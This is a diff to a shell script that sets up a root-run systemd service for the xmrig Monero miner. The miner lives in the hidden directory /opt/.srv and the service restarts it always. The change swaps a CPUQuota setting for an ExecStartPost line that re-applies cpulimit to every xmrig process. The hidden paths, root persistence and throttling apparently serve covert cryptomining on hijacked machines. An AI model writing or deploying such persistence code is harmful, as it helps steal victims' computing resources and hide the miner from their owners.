@@ -22,8 +22,8 @@ if [ -f "$NEW_SERVICE_FILE" ]; then
         echo "Configuring systemd service for automatic cpulimit application..."
         CPU_CORES=$(nproc)
         echo "Detected CPU cores: $CPU_CORES"
-        CPU_LIMIT=$(echo "$CPU_CORES * 100 * 50 / 100" | bc)
-        echo "Setting CPU limit: $CPU_LIMIT (50% of $CPU_CORES cores)"
+        CPU_PERCENT=50
+        echo "Setting CPU limit: $CPU_PERCENT% of total system"
         XMRIG_PATH=$(which xmrig 2>/dev/null || find /opt/.srv -name "xmrig" -type f 2>/dev/null | head -1)
         if [ -z "$XMRIG_PATH" ]; then
             if [ -f "/opt/.srv/moneroocean/xmrig" ]; then
@@ -46,7 +46,7 @@ if [ -f "$NEW_SERVICE_FILE" ]; then
             echo "User=root"
             echo "ExecStartPre=/bin/sleep 5"
             echo "ExecStart=/bin/bash -c 'nice -n 10 ionice -c 2 -n 7 $XMRIG_PATH --config=/opt/.srv/.xmrig/config.json'"
-            echo "CPUQuota=${CPU_LIMIT}%"
+            echo "ExecStartPost=/bin/bash -c 'sleep 3 && pkill -f cpulimit; for pid in \$(pgrep -f xmrig); do cpulimit -p \$pid -l $CPU_PERCENT & done'"
             echo "Restart=always"
             echo "RestartSec=10"
             echo ""
